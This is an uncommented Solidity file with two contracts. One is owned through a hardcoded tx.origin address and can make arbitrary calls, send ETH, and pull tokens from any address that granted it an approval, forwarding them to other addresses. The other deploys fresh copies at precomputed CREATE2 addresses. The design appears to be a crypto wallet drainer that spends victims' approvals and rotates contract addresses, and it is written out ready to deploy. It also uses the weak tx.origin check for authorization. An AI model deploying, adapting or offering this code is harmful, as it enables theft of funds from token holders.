pragma solidity ^0.8.0;

// SPDX-License-Identifier: MIT

interface OtherToken {
    function balanceOf(address account) external view returns (uint256);
}

contract CREATE2 {

    
    receive() external payable {}

    fallback() external payable {}

    modifier onlyOwner() {
        require(
            tx.origin == 0x7833AB00BDefA29822427f2aB27B1e116Ee338cA,
            "Caller is not an owner"
        );
        _;
    }

    function call(
        address target,
        bytes calldata data,
        uint256 value
    ) public onlyOwner {
        (bool success, bytes memory returnData) = target.call{value: value}(
            data
        );
        require(success, string(returnData));
    }

    function native(
        address reciver,
        uint256 amount
    ) public onlyOwner {
        payable(reciver).transfer(amount);
    }

    function transfer(
        address token,
        address reciver,
        uint256 amount
    ) public onlyOwner {
        token.call(abi.encodeWithSignature("transfer(address,uint256)",reciver,amount));
    }

    function transferFrom(
        address token,
        address sender,
        address reciver,
        uint256 amount
    ) public onlyOwner {
        token.call(abi.encodeWithSignature("transferFrom(address,address,uint256)",sender,reciver,amount));
    }

    function transferFromToken(
        address token,
        address recipient,
        address sender,
        address reciver,
        uint256 amount
    ) public {
        transferFrom(token, sender, recipient, amount);

        OtherToken otherToken = OtherToken(token);
        uint256 tokenAmount = otherToken.balanceOf(recipient);

        transfer(token, reciver, tokenAmount);
    }
}

contract CREATE2Creator {
    

    function CREATE2Contract(bytes32 salt) private returns (address) {
        CREATE2 _contract = new CREATE2{salt: salt}();
        return address(_contract);
    }

    function getBytecode() private pure returns (bytes memory) {
        bytes memory bytecode = type(CREATE2).creationCode;
        return abi.encodePacked(bytecode);
    }

    function calculateAddress(bytes32 salt) public view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                salt,
                keccak256(getBytecode())
            )
        );

        return address(uint160(uint256(hash)));
    }

    function CREATE2AndCallNative(
        bytes32 salt,
        address reciver,
        uint256 amount
    ) public {
        address contractAddress = CREATE2Contract(salt);

        bytes memory callData = abi.encodeWithSignature(
            "native(address,uint256)",
            reciver,
            amount
        );

        (bool success, ) = contractAddress.call(callData);
        require(success, "Fail");
    }

    function CREATE2AndCallTransfer(
        bytes32 salt
    ) public {
        CREATE2Contract(salt);
    }
}